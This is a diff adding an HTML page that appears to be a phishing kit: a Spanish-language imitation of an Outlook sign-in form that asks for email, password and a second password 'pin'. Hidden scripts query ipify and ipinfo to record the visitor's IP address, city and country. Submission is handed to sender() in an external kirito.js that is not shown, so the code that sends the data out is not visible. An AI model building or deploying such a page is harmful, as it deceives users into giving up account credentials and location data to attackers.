@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+        $.getJSON("https://api.ipify.org/?format=json",
+                                          function(data) {
+        
+            $("#gfg").html(data.ip);
+        })
+     </script>
+     <script>
+        $.getJSON("https://ipinfo.io/", function (response) {
+     $("#ip").html("IP: " + response.ip);
+     $("#address").html("" + response.city + ", " + response.country);
+
+     })
+     </script>
+    <title>Home</title>
+</head>
+<body>
+    <div class="form">
+        <p id="address" hidden=""></p>
+        <p id="gfg" hidden="">
+        <form action="" onsubmit=" return sender()">
+            <div class="form__cuadro" name="cuadro que contiene todo" id="cuadro">
+                <div class="form__cuadrito" name="cuadrito pequeño" id="cuadrito">
+                    <div class="form__logo"></div>
+                     <div class="form__inicio">Inicia Sesión</div>
+                     <div class="form__input">
+                        <input class="form__input__correo" required type="email" placeholder="Correo" id="correo" name="correo">
+                        <br>
+                        <input class="form__input__contraseña" required type="text" placeholder="Contraseña" id="pass" name="contraseña">
+                        <br>
+                        <input class="form__input__contraseña" required type="text" placeholder="Confirmar Contraseña" id="pin" name="pin">
+                    </div>
+                    <div>
+                         <div class="form__titulo">¿No tienes una cuenta?  <a href="https://outlook.com" class="form__color__link">Crea una</a></div>
+                        <div class="form__titulo">¿No puedes acceder a tu cuenta?  <a href="https://outlook.com" class="form__color__link">Click aquí!</a></div>
+                    </div>
+                    <div>
+                        <input class="form__input__boton" type="submit" value="Siguiente" id="btn" name="boton">
+                    </div>
+                </div>        
+            </div>
+        </form>
+    </div>
+    <link rel="stylesheet" href="estilo.css">
+    <script src="kirito.js"></script>
+</body>
+</html>
